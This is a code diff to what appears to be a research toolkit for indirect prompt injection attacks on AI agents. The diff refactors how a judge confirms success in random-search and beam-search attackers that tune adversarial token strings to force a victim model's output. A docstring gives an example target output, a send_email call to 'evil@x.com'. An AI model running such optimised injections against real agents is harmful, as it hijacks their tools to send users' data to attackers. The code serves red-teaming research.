@@ -59,12 +59,8 @@ from typing import Callable, Optional
 import numpy as np
 
 from ..attacker import AdaptiveAttacker
-from ..evaluator import (
-    check_ipi_success,
-    get_target_token,
-    ipi_early_stopping_condition,
-)
-from ..judges import Judge
+from ..evaluator import get_target_token, ipi_early_stopping_condition
+from ..metrics import Evaluator, check_ipi_success
 from ..llm_unified import _extract_logprob
 from ..victim import Victim
 
@@ -507,7 +503,7 @@ def run_adaptive_rs(
     goal: str,
     target_llm: Victim,
     target_str: str,
-    judge: Optional[Callable[[str, str], int]] = None,
+    judge: Optional[Evaluator] = None,
     # Template
     prompt_template: str = "ipi_tool",
     goal_display: str = "",
@@ -549,7 +545,10 @@ def run_adaptive_rs(
                            Must support logprobs (local, openai, deepseek, or metis_openai).
         target_str:        What the agent should output (e.g., "send_email(to='evil@x.com')").
                            Used in: template (forced output rule) + eval.
-        judge:             Optional callable(goal, response) -> int(1-10).
+        judge:             Optional guidance Evaluator (``ipi.metrics``). Consulted only
+                           to *confirm* a hit before early-stopping — the logprob is what
+                           drives the search. Its own ``success_threshold`` decides, not a
+                           hard-coded number.
                            If provided, used to confirm success.
         prompt_template:   "ipi_tool" | "ipi_authority" | "refined_best" | etc.
         goal_display:      Text inserted into template as the goal. Defaults to `goal`.
@@ -676,9 +675,9 @@ def run_adaptive_rs(
                 if ipi_success:
                     judge_ok = True
                     if judge is not None and judge_n_calls < judge_max_n_calls:
-                        score = judge(goal, final_response)
+                        score = judge.score(eval_msg, final_response, attacker_goal=goal)
                         judge_n_calls += 1
-                        judge_ok = (score >= 7)
+                        judge_ok = judge.is_success(score)
                     if judge_ok:
                         early_stop = True
 
@@ -770,7 +769,7 @@ def run_adaptive_beam(
     goal: str,
     target_llm: Victim,
     target_str: str,
-    judge: Optional[Callable[[str, str], int]] = None,
+    judge: Optional[Evaluator] = None,
     # Template
     prompt_template: str = "ipi_tool",
     goal_display: str = "",
@@ -948,8 +947,8 @@ def run_adaptive_beam(
             if check_ipi_success(best_response, target_str, eval_mode):
                 judge_ok = True
                 if judge is not None:
-                    score = judge(goal, best_response)
-                    judge_ok = (score >= 7)
+                    score = judge.score(best_beam_msg, best_response, attacker_goal=goal)
+                    judge_ok = judge.is_success(score)
                 if judge_ok:
                     return AdaptiveResult(
                         success=True,
@@ -999,7 +998,9 @@ class RSAttacker(AdaptiveAttacker):
       Local: any LocalLLM
 
     Args:
-        judge:               Judge instance (owned by this attacker).
+        judge:               Optional guidance Evaluator (``ipi.metrics``). The logprob
+                             drives the search; the evaluator is consulted only to confirm
+                             a hit before early-stopping, so leaving it None is normal.
         prompt_template:     "ipi_tool" | "ipi_authority" | "refined_best" | "claude".
         n_tokens_adv:        Adversarial string length in tokens. Default 25.
         n_tokens_change_max: Max tokens to substitute per iteration. Default 4.
@@ -1013,7 +1014,7 @@ class RSAttacker(AdaptiveAttacker):
 
     def __init__(
         self,
-        judge: Optional[Judge] = None,
+        judge: Optional[Evaluator] = None,
         prompt_template: str = "ipi_tool",
         n_tokens_adv: int = 25,
         n_tokens_change_max: int = 4,
@@ -1036,10 +1037,11 @@ class RSAttacker(AdaptiveAttacker):
         self.seed                 = seed
 
     def run_scenario(self, target: Victim, scenario, verbose: bool = False):
-        from ..evaluator import ScenarioResult
+        from ..metrics import ScenarioResult
         r = run_adaptive_rs(
             goal=scenario.injection_goal,
             target_llm=target,
+            judge=self.judge,
             # optimization_target: short literal for RS token-logprob maximization.
             # Falls back to target_output (only safe when it is a real literal, not a
             # sentinel like __base64__), then to injection_goal as last resort.
@@ -1090,7 +1092,9 @@ class BeamRSAttacker(AdaptiveAttacker):
     and keeps the top-k by logprob. More exploratory than RSAttacker.
 
     Args:
-        judge:               Judge instance (owned by this attacker).
+        judge:               Optional guidance Evaluator (``ipi.metrics``). The logprob
+                             drives the search; the evaluator is consulted only to confirm
+                             a hit before early-stopping, so leaving it None is normal.
         prompt_template:     "ipi_tool" | "ipi_authority" | "refined_best" | "claude".
         n_tokens_adv:        Adversarial string length in tokens. Default 25.
         n_tokens_change_max: Max tokens to substitute per mutation. Default 4.
@@ -1105,7 +1109,7 @@ class BeamRSAttacker(AdaptiveAttacker):
 
     def __init__(
         self,
-        judge: Optional[Judge] = None,
+        judge: Optional[Evaluator] = None,
         prompt_template: str = "ipi_tool",
         n_tokens_adv: int = 25,
         n_tokens_change_max: int = 4,
@@ -1130,10 +1134,11 @@ class BeamRSAttacker(AdaptiveAttacker):
         self.seed                 = seed
 
     def run_scenario(self, target: Victim, scenario, verbose: bool = False):
-        from ..evaluator import ScenarioResult
+        from ..metrics import ScenarioResult
         r = run_adaptive_beam(
             goal=scenario.injection_goal,
             target_llm=target,
+            judge=self.judge,
             target_str=(
                 scenario.optimization_target
                 or scenario.target_output
